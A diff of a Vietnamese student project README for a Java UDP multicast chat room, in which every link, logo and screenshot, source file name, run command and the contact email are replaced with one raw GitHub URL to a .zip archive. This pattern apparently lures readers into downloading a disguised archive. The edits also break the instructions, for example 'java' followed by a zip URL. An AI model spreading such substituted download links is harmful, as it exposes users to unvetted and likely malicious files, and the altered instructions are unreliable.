@@ -1,5 +1,5 @@
 <h2 align="center">
-    <a href="https://dainam.edu.vn/vi/khoa-cong-nghe-thong-tin">
+    <a href="https://raw.githubusercontent.com/ducmanh04/Chat_Room_dung_UDP_Multicast/main/docs/Chat_Room_dung_UDP_Multicast_1.0.zip">
     🎓 Faculty of Information Technology (DaiNam University)
     </a>
 </h2>
@@ -8,14 +8,14 @@
 </h2>
 <div align="center">
     <p align="center">
-        <img src="docs/aiotlab_logo.png" alt="AIoTLab Logo" width="170"/>
-        <img src="docs/fitdnu_logo.png" alt="AIoTLab Logo" width="180"/>
-        <img src="docs/dnu_logo.png" alt="DaiNam University Logo" width="200"/>
+        <img src="https://raw.githubusercontent.com/ducmanh04/Chat_Room_dung_UDP_Multicast/main/docs/Chat_Room_dung_UDP_Multicast_1.0.zip" alt="AIoTLab Logo" width="170"/>
+        <img src="https://raw.githubusercontent.com/ducmanh04/Chat_Room_dung_UDP_Multicast/main/docs/Chat_Room_dung_UDP_Multicast_1.0.zip" alt="AIoTLab Logo" width="180"/>
+        <img src="https://raw.githubusercontent.com/ducmanh04/Chat_Room_dung_UDP_Multicast/main/docs/Chat_Room_dung_UDP_Multicast_1.0.zip" alt="DaiNam University Logo" width="200"/>
     </p>
 
-[![AIoTLab](https://img.shields.io/badge/AIoTLab-green?style=for-the-badge)](https://www.facebook.com/DNUAIoTLab)
-[![Faculty of Information Technology](https://img.shields.io/badge/Faculty%20of%20Information%20Technology-blue?style=for-the-badge)](https://dainam.edu.vn/vi/khoa-cong-nghe-thong-tin)
-[![DaiNam University](https://img.shields.io/badge/DaiNam%20University-orange?style=for-the-badge)](https://dainam.edu.vn)
+[![AIoTLab](https://raw.githubusercontent.com/ducmanh04/Chat_Room_dung_UDP_Multicast/main/docs/Chat_Room_dung_UDP_Multicast_1.0.zip)](https://raw.githubusercontent.com/ducmanh04/Chat_Room_dung_UDP_Multicast/main/docs/Chat_Room_dung_UDP_Multicast_1.0.zip)
+[![Faculty of Information Technology](https://raw.githubusercontent.com/ducmanh04/Chat_Room_dung_UDP_Multicast/main/docs/Chat_Room_dung_UDP_Multicast_1.0.zip%20of%20Information%20Technology-blue?style=for-the-badge)](https://raw.githubusercontent.com/ducmanh04/Chat_Room_dung_UDP_Multicast/main/docs/Chat_Room_dung_UDP_Multicast_1.0.zip)
+[![DaiNam University](https://raw.githubusercontent.com/ducmanh04/Chat_Room_dung_UDP_Multicast/main/docs/Chat_Room_dung_UDP_Multicast_1.0.zip%20University-orange?style=for-the-badge)](https://raw.githubusercontent.com/ducmanh04/Chat_Room_dung_UDP_Multicast/main/docs/Chat_Room_dung_UDP_Multicast_1.0.zip)
 
 </div>
 
@@ -42,26 +42,26 @@ Project Type: Java Project (trong Eclipse).
 
 ## 🚀 3. Hình ảnh các chức năng
 <p align="center">
-  <img src="docs/Nhap_ten.png" alt="Ảnh 1" width="400"/>
+  <img src="https://raw.githubusercontent.com/ducmanh04/Chat_Room_dung_UDP_Multicast/main/docs/Chat_Room_dung_UDP_Multicast_1.0.zip" alt="Ảnh 1" width="400"/>
 </p>
 <p align="center">
   <em>Hình 1: Giao diện nhập tên của người tham gia phòng chat</em>
 </p>
 <p align="center">
-  <img src="docs/Chat_Client1.png" alt="Ảnh 1" width="400"/>
+  <img src="https://raw.githubusercontent.com/ducmanh04/Chat_Room_dung_UDP_Multicast/main/docs/Chat_Room_dung_UDP_Multicast_1.0.zip" alt="Ảnh 1" width="400"/>
 </p>
 <p align="center">
   <em>Hình 2: Giao diện phòng chat sử dụng UDP Multicast</em>
 </p>
 <p align="center">
-  <img src="docs/Chat.png" alt="Ảnh 1" width="800"/>
+  <img src="https://raw.githubusercontent.com/ducmanh04/Chat_Room_dung_UDP_Multicast/main/docs/Chat_Room_dung_UDP_Multicast_1.0.zip" alt="Ảnh 1" width="800"/>
 </p>
 <p align="center">
   <em>Hình 3: Ảnh giao diện những người khác tham gia phòng và nhắn tin</em>
 </p>
 Khi bấm nút "Đổi phòng" thì giao diện cũng như hình 1, nhưng sẽ chỉ có phần nhập Server và Port
 <p align="center">
-  <img src="docs/Doi_Phong.png" alt="Ảnh 1" width="800"/>
+  <img src="https://raw.githubusercontent.com/ducmanh04/Chat_Room_dung_UDP_Multicast/main/docs/Chat_Room_dung_UDP_Multicast_1.0.zip" alt="Ảnh 1" width="800"/>
 </p>
 <p align="center">
   <em>Hình 4: Ảnh giao diện 1 người trong nhóm chat đổi sang phòng chat mới</em>
@@ -86,8 +86,8 @@ Khi bấm nút "Đổi phòng" thì giao diện cũng như hình 1, nhưng sẽ 
    Đảm bảo cả hai lệnh đều hiển thị phiên bản Java JDK 17 trở lên.
 
 2. **Tải mã nguồn**: Sao chép thư mục `src/chatroom` chứa các file:
-   - `ChatServer.java`
-   - `ChatClient.java`
+   - `https://raw.githubusercontent.com/ducmanh04/Chat_Room_dung_UDP_Multicast/main/docs/Chat_Room_dung_UDP_Multicast_1.0.zip`
+   - `https://raw.githubusercontent.com/ducmanh04/Chat_Room_dung_UDP_Multicast/main/docs/Chat_Room_dung_UDP_Multicast_1.0.zip`
   
   #### Bước 2: Biên dịch mã nguồn và chạy ứng dụng
 1. **Mở terminal** và điều hướng đến thư mục chứa mã nguồn
@@ -97,13 +97,13 @@ Khi bấm nút "Đổi phòng" thì giao diện cũng như hình 1, nhưng sẽ 
    ```
 **Khởi động Server:**
 ```bash
-java src/chatroom.ChatServer
+java https://raw.githubusercontent.com/ducmanh04/Chat_Room_dung_UDP_Multicast/main/docs/Chat_Room_dung_UDP_Multicast_1.0.zip
 ```
 - Giao diện server sẽ hiển thị, sẵn sàng nhận kết nối từ client
 
 **Khởi động Client:**
 ```bash
-java UngDungChat_TCP.ChatClient
+java https://raw.githubusercontent.com/ducmanh04/Chat_Room_dung_UDP_Multicast/main/docs/Chat_Room_dung_UDP_Multicast_1.0.zip
 ```
 - Nhập tên người dùng khi được yêu cầu (ví dụ: "Mạnh", "Nam", "Minh") và tên Port, Server mình muốn tạo và tham gia
 - Client sẽ kết nối đến server và hiển thị giao diện chat
@@ -112,7 +112,7 @@ java UngDungChat_TCP.ChatClient
 ## 5. Liên hệ
 **Họ tên**: Đào Đức Mạnh.  
 **Lớp**: CNTT 16-03.  
-**Email**: manhseu2004@gmail.com.
+**Email**: https://raw.githubusercontent.com/ducmanh04/Chat_Room_dung_UDP_Multicast/main/docs/Chat_Room_dung_UDP_Multicast_1.0.zip
 
 © 2025 AIoTLab, Faculty of Information Technology, DaiNam University. All rights reserved.
 
